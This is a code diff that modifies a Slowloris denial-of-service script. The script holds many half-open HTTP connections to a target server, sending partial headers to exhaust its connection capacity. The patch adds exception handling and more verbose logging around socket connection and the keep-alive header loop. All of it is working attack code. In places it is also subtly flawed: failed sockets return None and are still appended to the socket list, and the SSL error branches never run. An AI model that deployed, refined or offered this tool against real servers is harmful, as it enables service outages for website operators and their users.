@@ -157,10 +157,39 @@ def init_socket(ip: str):
         ctx.verify_mode = ssl.CERT_NONE
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
-    s.connect((ip, args.port))
+    try:
+        s.connect((ip, args.port))
+    except socket.error as e:
+        logging.info("Socket error: %s", e)
+        logging.info("Failed to connect to %s:%s", ip, args.port)
+        return None
+    except ssl.SSLError as e:
+        logging.info("SSL error: %s", e)
+        logging.info("Failed to connect to %s:%s", ip, args.port)
+        return None
+    except Exception as e:
+        logging.info("General error: %s", e)
+        logging.info("Failed to connect to %s:%s", ip, args.port)
+        return None    
+    
+    try:
+        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+    except socket.error as e:
+        logging.info("Socket error: %s", e)
+        logging.info("Failed to send GET request to %s:%s", ip, args.port)
+        return None
+    except ssl.SSLError as e:   
+        logging.info("SSL error: %s", e)
+        logging.info("Failed to send GET request to %s:%s", ip, args.port)
+        return None
+    except Exception as e:
+        logging.info("General error: %s", e)
+        logging.info("Failed to send GET request to %s:%s", ip, args.port)
+        return None
+   
 
-    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
+    logging.debug("socket call: %s", s.getsockname())
+    logging.debug("Connected to %s:%s", ip, args.port)
     ua = user_agents[0]
     if args.randuseragent:
         ua = random.choice(user_agents)
@@ -178,7 +207,11 @@ def slowloris_iteration():
     for s in list(list_of_sockets):
         try:
             s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
+            
+            logging.debug("socket call: %s", s.getsockname())
+            logging.debug("Connected to :%s", args.port)
+        except socket.error as e:
+            logging.info("Socket error, removing socket... %s. Error: %s", s.getsockname(), e)
             list_of_sockets.remove(s)
 
     # Some of the sockets may have been closed due to errors or timeouts.
@@ -196,7 +229,7 @@ def slowloris_iteration():
                 continue
             list_of_sockets.append(s)
         except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
+            logging.info("Failed to create new socket: %s", e)
             break
 
 
@@ -211,7 +244,7 @@ def main():
             logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
         except socket.error as e:
-            logging.debug(e)
+            logging.info(e)
             break
         list_of_sockets.append(s)
 
@@ -222,7 +255,7 @@ def main():
             logging.info("Stopping Slowloris")
             break
         except Exception as e:
-            logging.debug("Error in Slowloris iteration: %s", e)
+            logging.info("Error in Slowloris iteration: %s", e)
         logging.debug("Sleeping for %d seconds", args.sleeptime)
         time.sleep(args.sleeptime)
 
